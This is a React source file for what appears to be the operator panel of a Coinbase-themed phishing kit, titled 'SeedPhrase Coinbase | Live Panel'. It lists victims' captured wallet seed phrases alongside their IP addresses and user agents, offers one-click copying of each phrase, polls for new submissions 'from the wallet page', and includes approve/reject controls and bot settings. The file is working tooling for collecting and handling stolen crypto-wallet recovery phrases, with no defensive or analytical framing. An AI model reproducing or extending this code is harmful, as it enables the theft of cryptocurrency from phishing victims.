import { useState, useEffect, useCallback } from 'react';
import { Entry, Toast } from '../types';
import { getSession } from '../services/auth';
import {
  fetchEntries,
  updateEntryStatus,
  deleteEntry,
  deleteMultipleEntries,
  clearAllEntries,
} from '../services/entries';
import UserAgentModal from './UserAgentModal';
import PasswordModal from './PasswordModal';
import BotSettingsModal from './BotSettingsModal';
import ConfirmDialog from './ConfirmDialog';

interface DashboardProps {
  username: string;
  onLogout: () => void;
  addToast: (message: string, type: Toast['type']) => void;
}

export default function Dashboard({ username, onLogout, addToast }: DashboardProps) {
  const [entries, setEntries] = useState<Entry[]>([]);
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());
  const [notifications, setNotifications] = useState(true);
  const [autoRefresh, setAutoRefresh] = useState(true);
  const [viewingAgent, setViewingAgent] = useState<string | null>(null);
  const [showPasswordModal, setShowPasswordModal] = useState(false);
  const [showBotModal, setShowBotModal] = useState(false);
  const [lastLogin, setLastLogin] = useState<string | null>(null);
  const [selectAll, setSelectAll] = useState(false);
  const [loading, setLoading] = useState(false);
  const [confirmAction, setConfirmAction] = useState<{
    title: string;
    message: string;
    onConfirm: () => void;
  } | null>(null);

  // Load session info
  useEffect(() => {
    const session = getSession();
    if (session?.lastLogin) {
      setLastLogin(session.lastLogin);
    }
  }, []);

  // Load entries
  const loadEntries = useCallback(() => {
    const data = fetchEntries();
    setEntries(data);
  }, []);

  useEffect(() => {
    loadEntries();
  }, [loadEntries]);

  // Listen for real-time new entries from the wallet page
  useEffect(() => {
    const handler = () => {
      loadEntries();
      if (notifications) {
        addToast('New submission received!', 'info');
      }
    };
    window.addEventListener('new-entry', handler);
    return () => window.removeEventListener('new-entry', handler);
  }, [loadEntries, notifications, addToast]);

  // Auto-refresh polling (every 3 seconds)
  useEffect(() => {
    if (!autoRefresh) return;
    const interval = setInterval(() => {
      loadEntries();
    }, 3000);
    return () => clearInterval(interval);
  }, [autoRefresh, loadEntries]);

  // Refresh handler
  const handleRefresh = () => {
    setLoading(true);
    setTimeout(() => {
      loadEntries();
      setLoading(false);
      if (notifications) {
        addToast('Data refreshed', 'info');
      }
    }, 300);
  };

  // Selection handlers
  const handleSelectAll = () => {
    if (selectAll) {
      setSelectedIds(new Set());
    } else {
      setSelectedIds(new Set(entries.map((e) => e.id)));
    }
    setSelectAll(!selectAll);
  };

  const handleSelectEntry = (id: string) => {
    const newSet = new Set(selectedIds);
    if (newSet.has(id)) {
      newSet.delete(id);
    } else {
      newSet.add(id);
    }
    setSelectedIds(newSet);
    setSelectAll(newSet.size === entries.length && entries.length > 0);
  };

  // Entry actions
  const handleApprove = (id: string) => {
    const updated = updateEntryStatus(id, 'verified');
    if (updated) {
      loadEntries();
      addToast(`Entry #${updated.index} approved`, 'success');
    }
  };

  const handleReject = (id: string) => {
    const updated = updateEntryStatus(id, 'rejected');
    if (updated) {
      loadEntries();
      addToast(`Entry #${updated.index} rejected`, 'info');
    }
  };

  const handleDelete = (id: string, index: number) => {
    setConfirmAction({
      title: 'Delete Entry',
      message: `Are you sure you want to delete entry #${index}? This action cannot be undone.`,
      onConfirm: () => {
        const success = deleteEntry(id);
        if (success) {
          selectedIds.delete(id);
          setSelectedIds(new Set(selectedIds));
          loadEntries();
          addToast(`Entry #${index} deleted`, 'success');
        }
        setConfirmAction(null);
      },
    });
  };

  const handleDeleteSelected = () => {
    if (selectedIds.size === 0) {
      addToast('No entries selected', 'error');
      return;
    }
    setConfirmAction({
      title: 'Delete Selected Entries',
      message: `Are you sure you want to delete ${selectedIds.size} selected entries? This action cannot be undone.`,
      onConfirm: () => {
        const count = deleteMultipleEntries(Array.from(selectedIds));
        setSelectedIds(new Set());
        setSelectAll(false);
        loadEntries();
        addToast(`${count} entries deleted`, 'success');
        setConfirmAction(null);
      },
    });
  };

  const handleClearAll = () => {
    if (entries.length === 0) {
      addToast('No entries to clear', 'error');
      return;
    }
    setConfirmAction({
      title: 'Clear All Entries',
      message: `Are you sure you want to delete ALL ${entries.length} entries? This action cannot be undone.`,
      onConfirm: () => {
        clearAllEntries();
        setSelectedIds(new Set());
        setSelectAll(false);
        loadEntries();
        addToast('All entries cleared', 'success');
        setConfirmAction(null);
      },
    });
  };

  const handleLogout = () => {
    setConfirmAction({
      title: 'Logout',
      message: 'Are you sure you want to logout?',
      onConfirm: () => {
        setConfirmAction(null);
        onLogout();
      },
    });
  };

  const getStatusBadge = (status: Entry['status']) => {
    switch (status) {
      case 'waiting':
        return (
          <span className="inline-flex items-center px-2.5 py-1 rounded text-xs font-medium bg-blue-500/20 text-blue-300 border border-blue-500/30">
            Waiting Verification
          </span>
        );
      case 'verified':
        return (
          <span className="inline-flex items-center px-2.5 py-1 rounded text-xs font-medium bg-green-500/20 text-green-300 border border-green-500/30">
            Verified
          </span>
        );
      case 'rejected':
        return (
          <span className="inline-flex items-center px-2.5 py-1 rounded text-xs font-medium bg-red-500/20 text-red-300 border border-red-500/30">
            Rejected
          </span>
        );
    }
  };

  const copySeedPhrase = async (phrase: string) => {
    try {
      await navigator.clipboard.writeText(phrase);
      addToast('Seed phrase copied to clipboard', 'success');
    } catch {
      addToast('Failed to copy', 'error');
    }
  };

  const pendingCount = entries.filter(e => e.status === 'waiting').length;

  return (
    <div className="min-h-screen bg-[#1a1a2e]">
      {/* Header */}
      <div className="bg-[#16213e] border-b border-gray-700/50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between py-4 gap-4">
            <h1 className="text-white text-xl sm:text-2xl font-bold tracking-wide">
              SeedPhrase Coinbase | Live Panel
            </h1>
            <div className="flex items-center gap-3 flex-wrap">
              {/* Welcome Badge */}
              <div className="flex items-center gap-2 bg-white rounded-lg px-3 py-1.5 shadow-lg">
                <svg className="w-5 h-5 text-green-500" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
                </svg>
                <span className="text-gray-800 text-sm font-medium">Welcome {username}</span>
              </div>
            </div>
          </div>

          {/* Sub-header controls */}
          <div className="flex items-center gap-3 pb-4 flex-wrap">
            <button
              onClick={() => {
                setNotifications(!notifications);
                addToast(`Notifications ${!notifications ? 'enabled' : 'disabled'}`, 'info');
              }}
              className={`flex items-center gap-1.5 text-xs font-medium px-3 py-1.5 rounded-md transition-all ${
                notifications
                  ? 'bg-green-500/20 text-green-400 border border-green-500/30'
                  : 'bg-gray-700/50 text-gray-400 border border-gray-600/30'
              }`}
            >
              <svg className="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.89 2 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z" />
              </svg>
              {notifications ? 'ON' : 'OFF'}
            </button>

            <button
              onClick={handleRefresh}
              disabled={loading}
              className="flex items-center gap-1.5 text-xs font-medium text-gray-300 hover:text-white px-3 py-1.5 rounded-md hover:bg-gray-700/50 transition-all border border-gray-600/30 disabled:opacity-50"
            >
              <svg className={`w-3.5 h-3.5 ${loading ? 'animate-spin' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2">
                <path strokeLinecap="round" strokeLinejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
              </svg>
              Refresh
            </button>

            <button
              onClick={() => {
                setAutoRefresh(!autoRefresh);
                addToast(`Auto-refresh ${!autoRefresh ? 'enabled (3s)' : 'disabled'}`, 'info');
              }}
              className={`flex items-center gap-1.5 text-xs font-medium px-3 py-1.5 rounded-md transition-all border ${
                autoRefresh
                  ? 'bg-teal-500/20 text-teal-400 border-teal-500/30'
                  : 'text-gray-400 border-gray-600/30 hover:bg-gray-700/50'
              }`}
            >
              <div className={`w-2 h-2 rounded-full ${autoRefresh ? 'bg-teal-400 animate-pulse' : 'bg-gray-500'}`} />
              Auto {autoRefresh ? 'ON' : 'OFF'}
            </button>

            <button
              onClick={() => setShowPasswordModal(true)}
              className="flex items-center gap-1.5 text-xs font-medium text-gray-300 hover:text-white px-3 py-1.5 rounded-md hover:bg-gray-700/50 transition-all border border-gray-600/30"
            >
              <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2">
                <path strokeLinecap="round" strokeLinejoin="round" d="M15.75 5.25a3 3 0 013 3m3 0a6 6 0 01-7.029 5.912c-.563-.097-1.159.026-1.563.43L10.5 17.25H8.25v2.25H6v2.25H2.25v-2.818c0-.597.237-1.17.659-1.591l6.499-6.499c.404-.404.527-1 .43-1.563A6 6 0 1121.75 8.25z" />
              </svg>
              Panel Password
            </button>
            <button
              onClick={() => setShowBotModal(true)}
              className="flex items-center gap-1.5 text-xs font-medium text-gray-300 hover:text-white px-3 py-1.5 rounded-md hover:bg-gray-700/50 transition-all border border-gray-600/30"
            >
              <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2">
                <path strokeLinecap="round" strokeLinejoin="round" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
              </svg>
              Bot Settings
            </button>

            <button
              onClick={handleLogout}
              className="flex items-center gap-1.5 bg-red-600 hover:bg-red-700 text-white text-xs font-bold px-4 py-1.5 rounded-md transition-all ml-auto"
            >
              <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2">
                <path strokeLinecap="round" strokeLinejoin="round" d="M15.75 9V5.25A2.25 2.25 0 0013.5 3h-6a2.25 2.25 0 00-2.25 2.25v13.5A2.25 2.25 0 007.5 21h6a2.25 2.25 0 002.25-2.25V15m3 0l3-3m0 0l-3-3m3 3H9" />
              </svg>
              Logout
            </button>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
        {/* Bulk action bar */}
        {selectedIds.size > 0 && (
          <div className="mb-4 flex items-center gap-3 bg-gray-800/50 border border-gray-700/50 rounded-lg px-4 py-3">
            <span className="text-gray-300 text-sm">
              {selectedIds.size} {selectedIds.size === 1 ? 'entry' : 'entries'} selected
            </span>
            <button
              onClick={handleDeleteSelected}
              className="bg-red-600 hover:bg-red-700 text-white text-xs font-medium px-3 py-1.5 rounded-md transition-all flex items-center gap-1"
            >
              <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2">
                <path strokeLinecap="round" strokeLinejoin="round" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
              </svg>
              Delete Selected
            </button>
          </div>
        )}

        {/* Entry count + clear */}
        {entries.length > 0 && (
          <div className="mb-4 flex items-center justify-between">
            <span className="text-gray-400 text-sm">
              {entries.length} {entries.length === 1 ? 'entry' : 'entries'} total
              {pendingCount > 0 && (
                <span className="ml-2 text-blue-400">
                  ({pendingCount} pending)
                </span>
              )}
            </span>
            <button
              onClick={handleClearAll}
              className="text-xs text-red-400 hover:text-red-300 transition-colors"
            >
              Clear All
            </button>
          </div>
        )}

        {/* Table or empty state */}
        {entries.length === 0 ? (
          <div className="bg-blue-100/90 border border-blue-200 rounded-lg p-4 text-center">
            <p className="text-gray-600 italic text-sm">No Active Users Yet.</p>
          </div>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full">
              <thead>
                <tr className="border-b border-gray-700/50">
                  <th className="py-3 px-2 text-left">
                    <input
                      type="checkbox"
                      checked={selectAll}
                      onChange={handleSelectAll}
                      className="w-4 h-4 rounded border-gray-500 bg-gray-700 text-teal-500 focus:ring-teal-500/50 cursor-pointer"
                    />
                  </th>
                  <th className="py-3 px-2 text-gray-400 text-xs font-semibold tracking-wider text-left">#</th>
                  <th className="py-3 px-3 text-gray-400 text-xs font-semibold tracking-wider text-left">Activity</th>
                  <th className="py-3 px-3 text-gray-400 text-xs font-semibold tracking-wider text-left">IP</th>
                  <th className="py-3 px-3 text-gray-400 text-xs font-semibold tracking-wider text-left">UserAgent</th>
                  <th className="py-3 px-3 text-gray-400 text-xs font-semibold tracking-wider text-left">Status</th>
                  <th className="py-3 px-3 text-gray-400 text-xs font-semibold tracking-wider text-left">Seed Phrase</th>
                  <th className="py-3 px-3 text-gray-400 text-xs font-semibold tracking-wider text-center">Action</th>
                </tr>
              </thead>
              <tbody>
                {entries.map((entry) => (
                  <tr
                    key={entry.id}
                    className={`border-b border-gray-700/30 hover:bg-gray-800/30 transition-colors ${
                      entry.status === 'waiting' ? 'bg-blue-900/10' : ''
                    }`}
                  >
                    <td className="py-3 px-2">
                      <input
                        type="checkbox"
                        checked={selectedIds.has(entry.id)}
                        onChange={() => handleSelectEntry(entry.id)}
                        className="w-4 h-4 rounded border-gray-500 bg-gray-700 text-teal-500 focus:ring-teal-500/50 cursor-pointer"
                      />
                    </td>
                    <td className="py-3 px-2 text-gray-300 text-sm">{entry.index}</td>
                    <td className="py-3 px-3">
                      <div className="text-gray-300 text-sm">{entry.activity}</div>
                      <div className="text-gray-500 text-xs mt-0.5">{entry.createdAt}</div>
                    </td>
                    <td className="py-3 px-3 text-gray-300 text-sm font-mono">{entry.ip}</td>
                    <td className="py-3 px-3">
                      <button
                        onClick={() => setViewingAgent(entry.userAgent)}
                        className="bg-gray-600 hover:bg-gray-500 text-white text-xs px-3 py-1 rounded transition-all"
                      >
                        View
                      </button>
                    </td>
                    <td className="py-3 px-3">{getStatusBadge(entry.status)}</td>
                    <td className="py-3 px-3">
                      <span
                        className="text-gray-300 text-xs font-mono leading-relaxed cursor-pointer hover:text-white transition-colors"
                        onClick={() => copySeedPhrase(entry.seedPhrase)}
                        title="Click to copy"
                      >
                        {entry.seedPhrase}
                      </span>
                    </td>
                    <td className="py-3 px-3">
                      <div className="flex items-center justify-center gap-1.5">
                        <button
                          onClick={() => handleApprove(entry.id)}
                          disabled={entry.status === 'verified'}
                          className="w-8 h-8 flex items-center justify-center rounded bg-green-600/20 hover:bg-green-600/40 text-green-400 transition-all disabled:opacity-30 disabled:cursor-not-allowed"
                          title="Approve"
                        >
                          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2">
                            <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                          </svg>
                        </button>
                        <button
                          onClick={() => handleReject(entry.id)}
                          disabled={entry.status === 'rejected'}
                          className="w-8 h-8 flex items-center justify-center rounded bg-red-600/20 hover:bg-red-600/40 text-red-400 transition-all disabled:opacity-30 disabled:cursor-not-allowed"
                          title="Reject"
                        >
                          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2">
                            <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
                          </svg>
                        </button>
                        <button
                          onClick={() => handleDelete(entry.id, entry.index)}
                          className="w-8 h-8 flex items-center justify-center rounded bg-gray-600/20 hover:bg-gray-600/40 text-gray-400 transition-all"
                          title="Delete"
                        >
                          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2">
                            <path strokeLinecap="round" strokeLinejoin="round" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
                          </svg>
                        </button>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}

        {/* Footer */}
        <div className="mt-8 text-center">
          <span className="inline-block border border-yellow-500/50 text-yellow-400 text-xs px-4 py-2 rounded-md">
            Developed By @Admin
          </span>
        </div>

        {lastLogin && (
          <div className="mt-4 text-center">
            <p className="text-gray-500 text-xs">last login : {lastLogin}</p>
          </div>
        )}
      </div>

      {/* Modals */}
      {viewingAgent && (
        <UserAgentModal
          userAgent={viewingAgent}
          onClose={() => setViewingAgent(null)}
        />
      )}
      {showPasswordModal && (
        <PasswordModal
          onClose={() => setShowPasswordModal(false)}
          onSuccess={(msg) => addToast(msg, 'success')}
          onError={(msg) => addToast(msg, 'error')}
        />
      )}
      {showBotModal && (
        <BotSettingsModal
          onClose={() => setShowBotModal(false)}
          onSuccess={(msg: string) => addToast(msg, 'success')}
        />
      )}
      {confirmAction && (
        <ConfirmDialog
          title={confirmAction.title}
          message={confirmAction.message}
          confirmLabel="Confirm"
          onConfirm={confirmAction.onConfirm}
          onCancel={() => setConfirmAction(null)}
        />
      )}
    </div>
  );
}
